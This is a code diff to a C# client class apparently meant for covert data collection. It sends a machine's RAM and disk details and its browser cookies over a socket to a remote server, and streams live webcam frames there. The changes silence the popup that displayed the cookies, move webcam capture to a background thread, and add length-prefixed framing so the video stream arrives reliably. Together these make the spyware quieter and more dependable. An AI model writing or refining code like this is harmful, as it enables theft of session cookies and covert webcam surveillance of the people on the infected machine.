@@ -27,6 +27,7 @@ namespace Test_Socket
         private Socket textSocket;
         private Socket videoSocket;
         private VideoCaptureDevice videoSource;
+        private Thread videoThread;
 
         public ClientCollecte(string IPserver, int portText, int portVideo)
         {
@@ -82,7 +83,7 @@ namespace Test_Socket
                 writer.WriteLine(ram);
                 writer.WriteLine(disk);
                 writer.WriteLine(cookies);
-                MessageBox.Show("Cookies : " + cookies);
+                //MessageBox.Show("Cookies : " + cookies);
                 writer.Flush();
                 //MessageBox.Show("Données envoyées au serveur.");
 
@@ -271,7 +272,8 @@ namespace Test_Socket
             {
                 videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                 videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
-                videoSource.Start();
+                videoThread = new Thread(() => videoSource.Start());
+                videoThread.Start();
             }
             else
             {
@@ -281,9 +283,16 @@ namespace Test_Socket
 
         private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
         {
-            Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
-            byte[] imageBytes = ImageToByteArray(bitmap);
-            SendVideoData(imageBytes);
+            try
+            {
+                Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
+                byte[] imageBytes = ImageToByteArray(bitmap);
+                SendVideoData(imageBytes);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Erreur lors du traitement de la nouvelle image : " + ex.Message);
+            }
         }
 
         private byte[] ImageToByteArray(Bitmap bitmap)
@@ -305,11 +314,29 @@ namespace Test_Socket
                     return;
                 }
 
+                // Ajouter un en-tête avec la longueur de la vidéo pour éviter la fragmentation
+                byte[] lengthHeader = BitConverter.GetBytes(videoData.Length);
+                videoSocket.Send(lengthHeader);
                 videoSocket.Send(videoData);
+
+                //MessageBox.Show("Vidéo en direct envoyée avec succès.");
             }
             catch (Exception ex)
             {
                 MessageBox.Show("Erreur lors de l'envoi de la vidéo : " + ex.Message);
+            }
+        }
+
+        public void StopVideoCapture()
+        {
+            if (videoSource != null && videoSource.IsRunning)
+            {
+                videoSource.SignalToStop();
+                videoSource.WaitForStop();
+            }
+            if (videoThread != null && videoThread.IsAlive)
+            {
+                videoThread.Join();
             }
         }
     }
